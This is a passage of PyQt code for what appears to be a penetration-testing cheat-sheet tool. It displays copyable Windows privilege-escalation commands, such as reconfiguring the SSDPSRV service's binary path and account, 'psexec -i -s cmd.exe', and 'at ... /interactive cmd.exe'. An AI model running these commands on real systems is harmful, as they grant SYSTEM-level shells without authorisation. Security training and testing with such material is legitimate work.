        self.wpe_26_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_26_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_26_Scan2_Copy)
        label_layout.addWidget(self.wpe_26_Scan2)
        self.tab4_container_layout.insertLayout(427, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_26_divider1
        if hasattr(self, 'wpe_26_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_divider1)
            self.wpe_26_divider1.deleteLater()
        self.wpe_26_divider1 = QFrame()
        self.wpe_26_divider1.setFrameShape(QFrame.HLine)
        self.wpe_26_divider1.setLineWidth(3)
        self.wpe_26_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_26_divider2
        if hasattr(self, 'wpe_26_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_divider2)
            self.wpe_26_divider2.deleteLater()
        self.wpe_26_divider2 = QFrame()
        self.wpe_26_divider2.setFrameShape(QFrame.HLine)
        self.wpe_26_divider2.setLineWidth(3)
        self.wpe_26_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_26_spacer1
        if hasattr(self, 'wpe_26_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_spacer1)
            self.wpe_26_spacer1.deleteLater()
        self.wpe_26_spacer1 = QLabel()
        self.wpe_26_spacer1.setFixedWidth(40)
        self.wpe_26_spacer1.setFixedHeight(50)
     
        # wpe_26_spacer2
        if hasattr(self, 'wpe_26_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_spacer2)
            self.wpe_26_spacer2.deleteLater()
        self.wpe_26_spacer2 = QLabel()
        self.wpe_26_spacer2.setFixedWidth(40)
        self.wpe_26_spacer2.setFixedHeight(50)
     
        # wpe_26 spacer & divider layout
        self.tab4_container_layout.insertWidget(428, self.wpe_26_spacer1)
        self.tab4_container_layout.insertWidget(429, self.wpe_26_divider1)
        self.tab4_container_layout.insertWidget(430, self.wpe_26_divider2)
        self.tab4_container_layout.insertWidget(431, self.wpe_26_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_26_Scan3
        if hasattr(self, 'wpe_26_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_26_Scan3)
            self.wpe_26_Scan3.deleteLater()
        self.wpe_26_Scan3 = QLabel("sc config SSDPSRV binpath= \"C:\\inetpub\dmin1\dmin1Maint.exe\"")
        self.wpe_26_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(432,self.wpe_26_Scan3)
     
        # wpe_26_Scan3_Copy
        if hasattr(self, 'wpe_26_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_26_Scan3_Copy)
            self.wpe_26_Scan3_Copy.deleteLater()
        self.wpe_26_Scan3_Copy = QPushButton()
        self.wpe_26_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_26_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_26_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_26_Scan3.text()))
        self.wpe_26_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_26_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_26_Scan3_Copy)
        label_layout.addWidget(self.wpe_26_Scan3)
        self.tab4_container_layout.insertLayout(433, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_26_divider1
        if hasattr(self, 'wpe_26_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_divider1)
            self.wpe_26_divider1.deleteLater()
        self.wpe_26_divider1 = QFrame()
        self.wpe_26_divider1.setFrameShape(QFrame.HLine)
        self.wpe_26_divider1.setLineWidth(3)
        self.wpe_26_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_26_divider2
        if hasattr(self, 'wpe_26_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_divider2)
            self.wpe_26_divider2.deleteLater()
        self.wpe_26_divider2 = QFrame()
        self.wpe_26_divider2.setFrameShape(QFrame.HLine)
        self.wpe_26_divider2.setLineWidth(3)
        self.wpe_26_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_26_spacer1
        if hasattr(self, 'wpe_26_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_spacer1)
            self.wpe_26_spacer1.deleteLater()
        self.wpe_26_spacer1 = QLabel()
        self.wpe_26_spacer1.setFixedWidth(40)
        self.wpe_26_spacer1.setFixedHeight(50)
     
        # wpe_26_spacer2
        if hasattr(self, 'wpe_26_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_spacer2)
            self.wpe_26_spacer2.deleteLater()
        self.wpe_26_spacer2 = QLabel()
        self.wpe_26_spacer2.setFixedWidth(40)
        self.wpe_26_spacer2.setFixedHeight(50)
     
        # wpe_26 spacer & divider layout
        self.tab4_container_layout.insertWidget(434, self.wpe_26_spacer1)
        self.tab4_container_layout.insertWidget(435, self.wpe_26_divider1)
        self.tab4_container_layout.insertWidget(436, self.wpe_26_divider2)
        self.tab4_container_layout.insertWidget(437, self.wpe_26_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_26_Scan4
        if hasattr(self, 'wpe_26_Scan4'):
            self.tab4_container_layout.removeWidget(self.wpe_26_Scan4)
            self.wpe_26_Scan4.deleteLater()
        self.wpe_26_Scan4 = QLabel("sc config SSDPSRV obj= \".\\LocalSystem\" password= \"\"")
        self.wpe_26_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(438,self.wpe_26_Scan4)
     
        # wpe_26_Scan4_Copy
        if hasattr(self, 'wpe_26_Scan4_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_26_Scan4_Copy)
            self.wpe_26_Scan4_Copy.deleteLater()
        self.wpe_26_Scan4_Copy = QPushButton()
        self.wpe_26_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_26_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wpe_26_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_26_Scan4.text()))
        self.wpe_26_Scan4_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_26_Scan4 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_26_Scan4_Copy)
        label_layout.addWidget(self.wpe_26_Scan4)
        self.tab4_container_layout.insertLayout(439, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_26_divider1
        if hasattr(self, 'wpe_26_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_divider1)
            self.wpe_26_divider1.deleteLater()
        self.wpe_26_divider1 = QFrame()
        self.wpe_26_divider1.setFrameShape(QFrame.HLine)
        self.wpe_26_divider1.setLineWidth(3)
        self.wpe_26_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_26_divider2
        if hasattr(self, 'wpe_26_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_divider2)
            self.wpe_26_divider2.deleteLater()
        self.wpe_26_divider2 = QFrame()
        self.wpe_26_divider2.setFrameShape(QFrame.HLine)
        self.wpe_26_divider2.setLineWidth(3)
        self.wpe_26_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_26_spacer1
        if hasattr(self, 'wpe_26_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_spacer1)
            self.wpe_26_spacer1.deleteLater()
        self.wpe_26_spacer1 = QLabel()
        self.wpe_26_spacer1.setFixedWidth(40)
        self.wpe_26_spacer1.setFixedHeight(50)
     
        # wpe_26_spacer2
        if hasattr(self, 'wpe_26_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_spacer2)
            self.wpe_26_spacer2.deleteLater()
        self.wpe_26_spacer2 = QLabel()
        self.wpe_26_spacer2.setFixedWidth(40)
        self.wpe_26_spacer2.setFixedHeight(50)
     
        # wpe_26 spacer & divider layout
        self.tab4_container_layout.insertWidget(440, self.wpe_26_spacer1)
        self.tab4_container_layout.insertWidget(441, self.wpe_26_divider1)
        self.tab4_container_layout.insertWidget(442, self.wpe_26_divider2)
        self.tab4_container_layout.insertWidget(443, self.wpe_26_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_26_Scan5
        if hasattr(self, 'wpe_26_Scan5'):
            self.tab4_container_layout.removeWidget(self.wpe_26_Scan5)
            self.wpe_26_Scan5.deleteLater()
        self.wpe_26_Scan5 = QLabel("sc config SSDPSRV start= \"demand\"")
        self.wpe_26_Scan5.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(444,self.wpe_26_Scan5)
     
        # wpe_26_Scan5_Copy
        if hasattr(self, 'wpe_26_Scan5_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_26_Scan5_Copy)
            self.wpe_26_Scan5_Copy.deleteLater()
        self.wpe_26_Scan5_Copy = QPushButton()
        self.wpe_26_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_26_Scan5_Copy.setFixedSize(QSize(20,20))
        self.wpe_26_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_26_Scan5.text()))
        self.wpe_26_Scan5_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_26_Scan5 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_26_Scan5_Copy)
        label_layout.addWidget(self.wpe_26_Scan5)
        self.tab4_container_layout.insertLayout(445, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_26_divider1
        if hasattr(self, 'wpe_26_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_divider1)
            self.wpe_26_divider1.deleteLater()
        self.wpe_26_divider1 = QFrame()
        self.wpe_26_divider1.setFrameShape(QFrame.HLine)
        self.wpe_26_divider1.setLineWidth(3)
        self.wpe_26_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_26_divider2
        if hasattr(self, 'wpe_26_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_divider2)
            self.wpe_26_divider2.deleteLater()
        self.wpe_26_divider2 = QFrame()
        self.wpe_26_divider2.setFrameShape(QFrame.HLine)
        self.wpe_26_divider2.setLineWidth(3)
        self.wpe_26_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_26_spacer1
        if hasattr(self, 'wpe_26_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_spacer1)
            self.wpe_26_spacer1.deleteLater()
        self.wpe_26_spacer1 = QLabel()
        self.wpe_26_spacer1.setFixedWidth(40)
        self.wpe_26_spacer1.setFixedHeight(50)
     
        # wpe_26_spacer2
        if hasattr(self, 'wpe_26_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_spacer2)
            self.wpe_26_spacer2.deleteLater()
        self.wpe_26_spacer2 = QLabel()
        self.wpe_26_spacer2.setFixedWidth(40)
        self.wpe_26_spacer2.setFixedHeight(50)
     
        # wpe_26 spacer & divider layout
        self.tab4_container_layout.insertWidget(446, self.wpe_26_spacer1)
        self.tab4_container_layout.insertWidget(447, self.wpe_26_divider1)
        self.tab4_container_layout.insertWidget(448, self.wpe_26_divider2)
        self.tab4_container_layout.insertWidget(449, self.wpe_26_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_26_Scan6
        if hasattr(self, 'wpe_26_Scan6'):
            self.tab4_container_layout.removeWidget(self.wpe_26_Scan6)
            self.wpe_26_Scan6.deleteLater()
        self.wpe_26_Scan6 = QLabel("net stop SSDPSRV")
        self.wpe_26_Scan6.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(450,self.wpe_26_Scan6)
     
        # wpe_26_Scan6_Copy
        if hasattr(self, 'wpe_26_Scan6_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_26_Scan6_Copy)
            self.wpe_26_Scan6_Copy.deleteLater()
        self.wpe_26_Scan6_Copy = QPushButton()
        self.wpe_26_Scan6_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_26_Scan6_Copy.setFixedSize(QSize(20,20))
        self.wpe_26_Scan6_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_26_Scan6.text()))
        self.wpe_26_Scan6_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_26_Scan6 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_26_Scan6_Copy)
        label_layout.addWidget(self.wpe_26_Scan6)
        self.tab4_container_layout.insertLayout(451, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_26_divider1
        if hasattr(self, 'wpe_26_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_divider1)
            self.wpe_26_divider1.deleteLater()
        self.wpe_26_divider1 = QFrame()
        self.wpe_26_divider1.setFrameShape(QFrame.HLine)
        self.wpe_26_divider1.setLineWidth(3)
        self.wpe_26_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_26_divider2
        if hasattr(self, 'wpe_26_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_divider2)
            self.wpe_26_divider2.deleteLater()
        self.wpe_26_divider2 = QFrame()
        self.wpe_26_divider2.setFrameShape(QFrame.HLine)
        self.wpe_26_divider2.setLineWidth(3)
        self.wpe_26_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_26_spacer1
        if hasattr(self, 'wpe_26_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_spacer1)
            self.wpe_26_spacer1.deleteLater()
        self.wpe_26_spacer1 = QLabel()
        self.wpe_26_spacer1.setFixedWidth(40)
        self.wpe_26_spacer1.setFixedHeight(50)
     
        # wpe_26_spacer2
        if hasattr(self, 'wpe_26_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_spacer2)
            self.wpe_26_spacer2.deleteLater()
        self.wpe_26_spacer2 = QLabel()
        self.wpe_26_spacer2.setFixedWidth(40)
        self.wpe_26_spacer2.setFixedHeight(50)
     
        # wpe_26 spacer & divider layout
        self.tab4_container_layout.insertWidget(452, self.wpe_26_spacer1)
        self.tab4_container_layout.insertWidget(453, self.wpe_26_divider1)
        self.tab4_container_layout.insertWidget(454, self.wpe_26_divider2)
        self.tab4_container_layout.insertWidget(455, self.wpe_26_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_26_Scan7
        if hasattr(self, 'wpe_26_Scan7'):
            self.tab4_container_layout.removeWidget(self.wpe_26_Scan7)
            self.wpe_26_Scan7.deleteLater()
        self.wpe_26_Scan7 = QLabel("net start SSDPSRV")
        self.wpe_26_Scan7.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(456,self.wpe_26_Scan7)
     
        # wpe_26_Scan7_Copy
        if hasattr(self, 'wpe_26_Scan7_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_26_Scan7_Copy)
            self.wpe_26_Scan7_Copy.deleteLater()
        self.wpe_26_Scan7_Copy = QPushButton()
        self.wpe_26_Scan7_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_26_Scan7_Copy.setFixedSize(QSize(20,20))
        self.wpe_26_Scan7_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_26_Scan7.text()))
        self.wpe_26_Scan7_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_26_Scan7 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_26_Scan7_Copy)
        label_layout.addWidget(self.wpe_26_Scan7)
        self.tab4_container_layout.insertLayout(457, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_26_divider1
        if hasattr(self, 'wpe_26_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_divider1)
            self.wpe_26_divider1.deleteLater()
        self.wpe_26_divider1 = QFrame()
        self.wpe_26_divider1.setFrameShape(QFrame.HLine)
        self.wpe_26_divider1.setLineWidth(3)
        self.wpe_26_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_26_divider2
        if hasattr(self, 'wpe_26_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_divider2)
            self.wpe_26_divider2.deleteLater()
        self.wpe_26_divider2 = QFrame()
        self.wpe_26_divider2.setFrameShape(QFrame.HLine)
        self.wpe_26_divider2.setLineWidth(3)
        self.wpe_26_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_26_spacer1
        if hasattr(self, 'wpe_26_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_26_spacer1)
            self.wpe_26_spacer1.deleteLater()
        self.wpe_26_spacer1 = QLabel()
        self.wpe_26_spacer1.setFixedWidth(40)
        self.wpe_26_spacer1.setFixedHeight(50)
     
        # wpe_26_spacer2
        if hasattr(self, 'wpe_26_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_26_spacer2)
            self.wpe_26_spacer2.deleteLater()
        self.wpe_26_spacer2 = QLabel()
        self.wpe_26_spacer2.setFixedWidth(40)
        self.wpe_26_spacer2.setFixedHeight(50)
     
        # wpe_26 spacer & divider layout
        self.tab4_container_layout.insertWidget(458, self.wpe_26_spacer1)
        self.tab4_container_layout.insertWidget(459, self.wpe_26_divider1)
        self.tab4_container_layout.insertWidget(460, self.wpe_26_divider2)
        self.tab4_container_layout.insertWidget(461, self.wpe_26_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_27
        if hasattr(self, 'wpe_27'):
            self.tab4_container_layout.removeWidget(self.wpe_27)
            self.wpe_27.deleteLater()
        self.wpe_27 = QLabel("[ + Up to Vista]")
        self.wpe_27.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(462,self.wpe_27)
     
        # wpe_27_Scan1
        if hasattr(self, 'wpe_27_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_27_Scan1)
            self.wpe_27_Scan1.deleteLater()
        self.wpe_27_Scan1 = QLabel("psexec -i -s cmd.exe")
        self.wpe_27_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(463,self.wpe_27_Scan1)
     
        # wpe_27_Scan1_Copy
        if hasattr(self, 'wpe_27_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_27_Scan1_Copy)
            self.wpe_27_Scan1_Copy.deleteLater()
        self.wpe_27_Scan1_Copy = QPushButton()
        self.wpe_27_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_27_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_27_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_27_Scan1.text()))
        self.wpe_27_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_27_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_27_Scan1_Copy)
        label_layout.addWidget(self.wpe_27_Scan1)
        self.tab4_container_layout.insertLayout(464, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_27_divider1
        if hasattr(self, 'wpe_27_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_27_divider1)
            self.wpe_27_divider1.deleteLater()
        self.wpe_27_divider1 = QFrame()
        self.wpe_27_divider1.setFrameShape(QFrame.HLine)
        self.wpe_27_divider1.setLineWidth(3)
        self.wpe_27_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_27_divider2
        if hasattr(self, 'wpe_27_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_27_divider2)
            self.wpe_27_divider2.deleteLater()
        self.wpe_27_divider2 = QFrame()
        self.wpe_27_divider2.setFrameShape(QFrame.HLine)
        self.wpe_27_divider2.setLineWidth(3)
        self.wpe_27_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_27_spacer1
        if hasattr(self, 'wpe_27_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_27_spacer1)
            self.wpe_27_spacer1.deleteLater()
        self.wpe_27_spacer1 = QLabel()
        self.wpe_27_spacer1.setFixedWidth(40)
        self.wpe_27_spacer1.setFixedHeight(50)
     
        # wpe_27_spacer2
        if hasattr(self, 'wpe_27_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_27_spacer2)
            self.wpe_27_spacer2.deleteLater()
        self.wpe_27_spacer2 = QLabel()
        self.wpe_27_spacer2.setFixedWidth(40)
        self.wpe_27_spacer2.setFixedHeight(50)
     
        # wpe_27 spacer & divider layout
        self.tab4_container_layout.insertWidget(465, self.wpe_27_spacer1)
        self.tab4_container_layout.insertWidget(466, self.wpe_27_divider1)
        self.tab4_container_layout.insertWidget(467, self.wpe_27_divider2)
        self.tab4_container_layout.insertWidget(468, self.wpe_27_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_28
        if hasattr(self, 'wpe_28'):
            self.tab4_container_layout.removeWidget(self.wpe_28)
            self.wpe_28.deleteLater()
        self.wpe_28 = QLabel("[ + On Windows XP and Older we can get an Administrator Privilege shell]")
        self.wpe_28.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(469,self.wpe_28)
     
        # wpe_28_Scan1
        if hasattr(self, 'wpe_28_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_28_Scan1)
            self.wpe_28_Scan1.deleteLater()
        self.wpe_28_Scan1 = QLabel("open cmd from C:\\windows\\system32\\cmd.exe")	
        self.wpe_28_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(470,self.wpe_28_Scan1)
     
        # wpe_28_Scan1_Copy
        if hasattr(self, 'wpe_28_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_28_Scan1_Copy)
            self.wpe_28_Scan1_Copy.deleteLater()
        self.wpe_28_Scan1_Copy = QPushButton()
        self.wpe_28_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_28_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_28_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_28_Scan1.text()))
        self.wpe_28_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_28_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_28_Scan1_Copy)
        label_layout.addWidget(self.wpe_28_Scan1)
        self.tab4_container_layout.insertLayout(471, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_28_divider1
        if hasattr(self, 'wpe_28_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_28_divider1)
            self.wpe_28_divider1.deleteLater()
        self.wpe_28_divider1 = QFrame()
        self.wpe_28_divider1.setFrameShape(QFrame.HLine)
        self.wpe_28_divider1.setLineWidth(3)
        self.wpe_28_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_28_divider2
        if hasattr(self, 'wpe_28_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_28_divider2)
            self.wpe_28_divider2.deleteLater()
        self.wpe_28_divider2 = QFrame()
        self.wpe_28_divider2.setFrameShape(QFrame.HLine)
        self.wpe_28_divider2.setLineWidth(3)
        self.wpe_28_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_28_spacer1
        if hasattr(self, 'wpe_28_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_28_spacer1)
            self.wpe_28_spacer1.deleteLater()
        self.wpe_28_spacer1 = QLabel()
        self.wpe_28_spacer1.setFixedWidth(40)
        self.wpe_28_spacer1.setFixedHeight(50)
     
        # wpe_28_spacer2
        if hasattr(self, 'wpe_28_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_28_spacer2)
            self.wpe_28_spacer2.deleteLater()
        self.wpe_28_spacer2 = QLabel()
        self.wpe_28_spacer2.setFixedWidth(40)
        self.wpe_28_spacer2.setFixedHeight(50)
     
        # wpe_28 spacer & divider layout
        self.tab4_container_layout.insertWidget(472, self.wpe_28_spacer1)
        self.tab4_container_layout.insertWidget(473, self.wpe_28_divider1)
        self.tab4_container_layout.insertWidget(474, self.wpe_28_divider2)
        self.tab4_container_layout.insertWidget(475, self.wpe_28_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_28_Scan2
        if hasattr(self, 'wpe_28_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_28_Scan2)
            self.wpe_28_Scan2.deleteLater()
        self.wpe_28_Scan2 = QLabel("time")
        self.wpe_28_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(476,self.wpe_28_Scan2)
     
        # wpe_28_Scan2_Copy
        if hasattr(self, 'wpe_28_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_28_Scan2_Copy)
            self.wpe_28_Scan2_Copy.deleteLater()
        self.wpe_28_Scan2_Copy = QPushButton()
        self.wpe_28_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_28_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_28_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_28_Scan2.text()))
        self.wpe_28_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_28_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_28_Scan2_Copy)
        label_layout.addWidget(self.wpe_28_Scan2)
        self.tab4_container_layout.insertLayout(477, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_28_divider1
        if hasattr(self, 'wpe_28_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_28_divider1)
            self.wpe_28_divider1.deleteLater()
        self.wpe_28_divider1 = QFrame()
        self.wpe_28_divider1.setFrameShape(QFrame.HLine)
        self.wpe_28_divider1.setLineWidth(3)
        self.wpe_28_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_28_divider2
        if hasattr(self, 'wpe_28_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_28_divider2)
            self.wpe_28_divider2.deleteLater()
        self.wpe_28_divider2 = QFrame()
        self.wpe_28_divider2.setFrameShape(QFrame.HLine)
        self.wpe_28_divider2.setLineWidth(3)
        self.wpe_28_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_28_spacer1
        if hasattr(self, 'wpe_28_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_28_spacer1)
            self.wpe_28_spacer1.deleteLater()
        self.wpe_28_spacer1 = QLabel()
        self.wpe_28_spacer1.setFixedWidth(40)
        self.wpe_28_spacer1.setFixedHeight(50)
     
        # wpe_28_spacer2
        if hasattr(self, 'wpe_28_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_28_spacer2)
            self.wpe_28_spacer2.deleteLater()
        self.wpe_28_spacer2 = QLabel()
        self.wpe_28_spacer2.setFixedWidth(40)
        self.wpe_28_spacer2.setFixedHeight(50)
     
        # wpe_28 spacer & divider layout
        self.tab4_container_layout.insertWidget(478, self.wpe_28_spacer1)
        self.tab4_container_layout.insertWidget(479, self.wpe_28_divider1)
        self.tab4_container_layout.insertWidget(480, self.wpe_28_divider2)
        self.tab4_container_layout.insertWidget(481, self.wpe_28_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_28_Scan3
        if hasattr(self, 'wpe_28_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_28_Scan3)
            self.wpe_28_Scan3.deleteLater()
        self.wpe_28_Scan3 = QLabel("at 01:23 /interactive cmd.exe")
        self.wpe_28_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(482,self.wpe_28_Scan3)
     
        # wpe_28_Scan3_Copy
        if hasattr(self, 'wpe_28_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_28_Scan3_Copy)
            self.wpe_28_Scan3_Copy.deleteLater()
        self.wpe_28_Scan3_Copy = QPushButton()
        self.wpe_28_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_28_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_28_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_28_Scan3.text()))
        self.wpe_28_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_28_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_28_Scan3_Copy)
        label_layout.addWidget(self.wpe_28_Scan3)
        self.tab4_container_layout.insertLayout(483, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_28_divider1
        if hasattr(self, 'wpe_28_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_28_divider1)
            self.wpe_28_divider1.deleteLater()
        self.wpe_28_divider1 = QFrame()
        self.wpe_28_divider1.setFrameShape(QFrame.HLine)
        self.wpe_28_divider1.setLineWidth(3)
        self.wpe_28_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_28_divider2
        if hasattr(self, 'wpe_28_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_28_divider2)
            self.wpe_28_divider2.deleteLater()
        self.wpe_28_divider2 = QFrame()
        self.wpe_28_divider2.setFrameShape(QFrame.HLine)
        self.wpe_28_divider2.setLineWidth(3)
